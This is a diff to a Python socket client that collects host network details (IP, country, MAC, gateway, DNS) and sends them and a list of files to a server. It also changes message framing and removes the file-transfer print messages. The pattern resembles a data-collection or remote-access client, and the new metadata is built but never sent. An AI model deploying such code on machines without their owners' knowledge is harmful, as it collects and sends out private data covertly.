@@ -31,7 +31,7 @@ class Client:
         self.send_system_info()
 
         # Send a file to the server from: cool.txt
-        self.send_file("cool.txt")
+        #self.send_file("cool.txt")
 
     def connect_to_server(self) -> None:
         """Connect to the server."""
@@ -61,7 +61,7 @@ class Client:
             "ip": ip,
             "client_ip": self.client.getsockname()[0],
             "country": country,
-            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)]),
+            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)]),
             "gateway": psutil.net_if_addrs().get('Ethernet')[1].address if psutil.net_if_addrs().get('Ethernet') else 'N/A',
             "dns": ', '.join([dns.address for dns in psutil.net_if_addrs().get('Ethernet') if dns and dns.family == 2]) if psutil.net_if_addrs().get('Ethernet') else 'N/A',
             "subnet_mask": psutil.net_if_addrs().get('Ethernet')[0].netmask if psutil.net_if_addrs().get('Ethernet') else 'N/A',
@@ -78,49 +78,46 @@ class Client:
         for file in files:
             self.send_file(file)
 
-    def send(self, data: str, chunk_size: int = 1024) -> None:
+    def send(self, data: str, chunk_size: int = 2048) -> None:
         """Send data in chunks to the server with a header."""
-        # Encode the data and append the delimiter
-        data_bytes = (data + "END_OF_MESSAGE").encode('utf-8')
+        header = json.dumps({
+            "type": "JSON",
+            "total_size": len(data),
+        })
 
-        # Prepare the header
-        message_type = b"JSON"  # 4 bytes
-        total_size = len(data_bytes)
-        header = struct.pack(">4sI", message_type, total_size)  # 4 bytes + 4 bytes
+        self.client.sendall(header.encode('utf-8'))
 
-        # Send the header first
-        self.client.sendall(header)
-
-        # Send the data in chunks
-        for i in range(0, total_size, chunk_size):
-            chunk = data_bytes[i:i + chunk_size]
+        for i in range(0, len(data), chunk_size):
+            chunk = data[i:i+chunk_size].encode('utf-8')
             self.client.sendall(chunk)
+        self.client.sendall(b'END_OF_MESSAGE')
 
     def send_file(self, file_path: str) -> None:
         """Send a file to the server with metadata."""
-        print(f"Sending file '{file_path}' to server...")
+        header = json.dumps({
+            "type": "JSON",
+            "total_size": 0,
+        })
+
+        self.client.sendall(header.encode('utf-8'))
 
         file_size = os.path.getsize(file_path)
         file_name = os.path.basename(file_path)
+        file_type = utils.get_mime_type(file_path)
 
-        # Notify the server about the file metadata
         metadata = json.dumps({
             "type": MESSAGE_TYPE_PREFILE,
             "file_name": file_name,
             "file_size": file_size,
+            "file_type": file_type,
         })
-        metadata_bytes = metadata.encode('utf-8')
-        header = struct.pack(">4sI", b"JSON", len(metadata_bytes))
-        self.client.sendall(header + metadata_bytes)
 
-        # Send the file in chunks
+        metadata_bytes = metadata.encode('utf-8')
+
         with open(file_path, "rb") as file:
             while chunk := file.read(1024):
                 header = struct.pack(">4sI", b"FILE", len(chunk))
                 self.client.sendall(header + chunk)
-
-        print(f"File '{file_name}' sent successfully.")
-
 
     def receive(self) -> str:
         chunks = []
@@ -134,7 +131,7 @@ class Client:
 
     def send_keep_alive(self) -> None:
         try:
-            self.send(json.dumps(Message(type=MESSAGE_TYPE_PING, data=None).to_dict()))
+            self.send(json.dumps(Message(type=MESSAGE_TYPE_PING).to_dict()))
         except Exception as e:
             print(f"Failed to send keep-alive message: {e}")
 
